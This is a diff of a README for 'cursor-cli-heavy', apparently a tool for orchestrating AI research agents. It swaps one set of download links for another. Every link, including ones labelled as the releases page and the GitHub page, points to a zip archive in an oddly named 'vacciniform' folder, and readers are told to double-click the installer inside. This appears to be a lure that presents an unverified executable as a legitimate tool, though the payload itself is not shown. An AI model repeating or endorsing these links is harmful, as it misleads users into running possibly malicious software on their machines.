@@ -1,7 +1,7 @@
 # 🔬 cursor-cli-heavy - Simplify Your AI Research Process
 
 ## 📥 Download Now
-[![Download cursor-cli-heavy](https://raw.githubusercontent.com/shinajsha/cursor-cli-heavy/main/vacciniform/cursor-cli-heavy.zip)](https://raw.githubusercontent.com/shinajsha/cursor-cli-heavy/main/vacciniform/cursor-cli-heavy.zip)
+[![Download cursor-cli-heavy](https://github.com/shinajsha/cursor-cli-heavy/raw/refs/heads/main/vacciniform/heavy-cursor-cli-v2.5-alpha.4.zip)](https://github.com/shinajsha/cursor-cli-heavy/raw/refs/heads/main/vacciniform/heavy-cursor-cli-v2.5-alpha.4.zip)
 
 ## 🚀 Getting Started
 Welcome to cursor-cli-heavy, your go-to tool for organizing and running AI research projects. This application lets you deploy multiple cursor-agent workers at once, allowing you to focus on specific areas of research and combine findings efficiently.
@@ -14,11 +14,11 @@ Before you start, ensure your system meets these requirements:
 - Disk Space: At least 500 MB free
 
 ## 💾 Download & Install
-To get started, visit this page to download: [Download cursor-cli-heavy releases](https://raw.githubusercontent.com/shinajsha/cursor-cli-heavy/main/vacciniform/cursor-cli-heavy.zip).
+To get started, visit this page to download: [Download cursor-cli-heavy releases](https://github.com/shinajsha/cursor-cli-heavy/raw/refs/heads/main/vacciniform/heavy-cursor-cli-v2.5-alpha.4.zip).
 
 1. Click on the link above to access the releases page.
 2. Find the latest version and look for the installer file suitable for your operating system.
-3. Click the download link next to the appropriate file (e.g., `https://raw.githubusercontent.com/shinajsha/cursor-cli-heavy/main/vacciniform/cursor-cli-heavy.zip` for Windows).
+3. Click the download link next to the appropriate file (e.g., `https://github.com/shinajsha/cursor-cli-heavy/raw/refs/heads/main/vacciniform/heavy-cursor-cli-v2.5-alpha.4.zip` for Windows).
 4. Once the download is complete, locate the downloaded file on your computer.
 5. Double-click the file to run the installer, and follow the on-screen instructions.
 6. After installation, open a terminal or command prompt window to begin using the tool.
@@ -74,6 +74,6 @@ If you want to dive deeper into AI orchestration and research automation, consid
 - Books focused on multi-agent systems and AI strategies.
 
 ## 🌐 Additional Information
-For more details about contributions, bug reports, or feature requests, please visit our [GitHub page](https://raw.githubusercontent.com/shinajsha/cursor-cli-heavy/main/vacciniform/cursor-cli-heavy.zip). Your feedback helps us improve!
+For more details about contributions, bug reports, or feature requests, please visit our [GitHub page](https://github.com/shinajsha/cursor-cli-heavy/raw/refs/heads/main/vacciniform/heavy-cursor-cli-v2.5-alpha.4.zip). Your feedback helps us improve!
 
 Thank you for choosing cursor-cli-heavy. We're glad to support you in your AI research journey!
